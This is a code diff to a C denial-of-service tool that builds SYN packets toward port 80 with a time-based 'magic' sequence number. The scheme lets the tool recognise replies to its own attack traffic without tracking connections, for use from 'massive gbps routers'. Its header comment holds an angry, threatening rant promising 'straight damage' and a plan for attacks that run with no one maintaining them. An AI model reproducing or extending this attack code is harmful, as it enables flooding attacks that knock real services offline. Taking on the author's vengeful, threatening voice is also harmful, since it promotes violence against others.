@@ -37,6 +37,21 @@ the more IPs is better for connectivity but extremely tough for firewalling, etc
 very expensive rape huh?  the damages will not  be known for a long time.. like i mentioned  in my fax to congress... still think these rapists will walk away?
 im far fromm done.. no more demonstration just straight damage. alrighty.. i was drugged 4 days ago.. dont blame anyone but all of yourselves.
 I bet in the future you don't take me as doing nothing as the end of things.  Its called strategy. I just wanted to ensure nobody would be left.
+
+and they say you have to join, and wait to be on the inside to destroy something/someones way.. im pretty sure ill have everyone out of the way before
+that option ever arrives.
+
+
+
+version 2-----
+
+Two nodes, or a helper server can monitor and keep track of port 80 requests (somme) and autoatically check,and add them to a list
+which would populate the system in a way where it would require zero people to perform massive attacks.. it would auto configure
+itself, and know which IPs are useful without anyone ever  updaating, or modifying the system
+
+automation at its best.
+
+
 */
 
 #include <stdio.h>
@@ -138,26 +153,8 @@ int FilterIsOurPacket(PacketBuildInstructions *iptr) {
     // first we ensure its SYN|ACK
     if (!(iptr->flags & TCP_FLAG_SYN) && (iptr->flags & TCP_FLAG_ACK)) return 0;
 
-    // now lets use the checksum designed for it
-    // set memory to 0 for our structure
-    xyz.b = 0;
-    // first we get an identifier for the IP
-    xyz.a.c = ((iptr->source_ip % 1024) & 0x000000ff);
-    // then we get an identifier for the port
-    xyz.a.d = (iptr->source_port & 0x000000ff);
-    // checksum sortof
-    xyz.a.e = ((xyz.a.c + xyz.a.d) &0x000000ff);
-    
-    // now we check against the current time, and allow a little variation
-    ts -= 3;
-    for (i =0; i < 5; i++) {
-        xyz.a.a = ((ts + i) / 2) & 0x0000000f;
-        xyz.a.b = ((ts + i) % 2) & 0x0000000f;
-
-        // if it matches then its golden.. we proceed with the attack
-        if (xyz.b == iptr->seq)
-            return 1;
-    }
+    // we verify against the packets DESTINATION. since we are responding to the servers
+    if (packet_filter(iptr->seq, iptr->destination_ip, iptr->destination_port, ts, NULL)) return 1;
 
     return 0;
 }
@@ -359,18 +356,18 @@ int Cyberwarefare_DDoS_Init(AS_context *ctx) {
 
 
 int Cyberwarfare_SendAttack1(AS_context *ctx, uint32_t src, uint32_t dst, int ts, OutgoingPacketQueue **optr) {
-    uint32_t seq = 0;
+    uint32_t magic_seq = 0;
     PacketBuildInstructions *bptr = NULL;
     int src_port = 60000 + rand()%5000;
     
     // build magic SEQ so we dont have to keep track of connections.. (golden for executing this attack from massive gbps routers)
-    packet_filter(0, src, src_port, ts, &seq);
+    packet_filter(0, src, src_port, ts, &magic_seq);
 
     // build packet for opening connection to initiate the attack
     bptr = CW_BasePacket(src, src_port, dst, 80, TCP_FLAG_SYN|TCP_OPTIONS|TCP_OPTIONS_TIMESTAMP|TCP_OPTIONS_WINDOW);
 
     if (bptr) {
-        bptr->seq = seq;
+        bptr->seq = magic_seq;
         bptr->ack = 0;
         bptr->header_identifier = rand()%0xffffffff;
 
